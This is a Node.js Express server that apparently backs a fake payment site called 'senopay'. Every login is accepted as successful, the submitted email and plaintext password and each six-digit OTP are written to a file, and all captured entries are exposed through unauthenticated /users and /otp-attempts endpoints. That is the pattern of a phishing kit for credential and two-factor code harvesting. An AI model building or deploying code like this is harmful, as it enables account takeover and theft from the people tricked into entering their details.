const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const port = process.env.PORT || 3000;

const LOGIN_ATTEMPTS_FILE = path.join(__dirname, "loginAttempts.json");
const USERS_FILE = "users.json";

const readUsers = () => {
    if (!fs.existsSync(USERS_FILE)) return [];
    return JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
};
const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
};
// Middleware configuration
app.use(express.json());
app.use(cors());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, "public")));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "senopay.html"));
});

// Function to read data from a JSON file
function readJsonFile(filePath, defaultValue = []) {
    try {
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
        }
        return JSON.parse(fs.readFileSync(filePath, "utf8"));
    } catch (err) {
        console.error(`Error reading ${filePath}:`, err);
        return defaultValue;
    }
}

// Function to write data to a JSON file
function writeJsonFile(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
    } catch (err) {
        console.error(`Error writing to ${filePath}:`, err);
    }
}

// Function to log login attempts
function logLoginAttempt(email, password, verificationCode) {
    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
    const timestamp = new Date().toISOString();
    
    loginAttempts.push({ email, password, verificationCode, timestamp });
    writeJsonFile(LOGIN_ATTEMPTS_FILE, loginAttempts);
}

// API endpoint for login (generating OTP)
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
        
        logLoginAttempt(email, password, verificationCode);

        return res.status(200).json({ 
            message: "Login successful. Verification required.",
            verificationCode, // ⚠️ Remove this in production
        });
    } else {
        logLoginAttempt(email, "failure", null);
        return res.status(401).json({ message: "Invalid credentials" });
    }
});

// API endpoint to get the list of login attempts
app.get("/users", (req, res) => {
    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
    return res.status(200).json(loginAttempts);
});

// Function to log OTP verification attempts
function logOtpAttempt(code, status) {
    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE);
    const timestamp = new Date().toISOString();

    loginAttempts.push({ otpCode: code, status, timestamp });
    writeJsonFile(LOGIN_ATTEMPTS_FILE, loginAttempts);
}
app.post("/save-user", (req, res) => {
    let users = readUsers();
    const { id, username, amount } = req.body;

    let userIndex = users.findIndex(user => user.id === id);
    if (userIndex !== -1) {
        users[userIndex] = { id, username, amount };  // Update existing user
    } else {
        users.push({ id, username, amount });  // Add new user
    }

    writeUsers(users);
    res.status(200).json({ message: "User saved successfully" });
});

// API endpoint for OTP verification
app.post("/verify", (req, res) => {
    const { code } = req.body;

    console.log("Received OTP:", code);

    if (code && code.length === 6) {
        logOtpAttempt(code, "success");
        return res.status(200).json({ message: "OTP Received Successfully!" });
    } else {
        logOtpAttempt(code, "failure");
        return res.status(400).json({ message: "Invalid OTP format!" });
    }
});
app.get("/otp-attempts", (req, res) => {
    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
    return res.status(200).json(loginAttempts);
});
// API to update a user
app.post("/update-user/:id", (req, res) => {
    const userId = parseInt(req.params.id);
    const { field, newValue } = req.body;
    
    let users = readUsers();
    let user = users.find(u => u.id === userId);
    
    if (user) {
        user[field] = newValue;
        writeUsers(users);
        res.json({ message: "User updated successfully", user });
    } else {
        res.status(404).json({ message: "User not found" });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});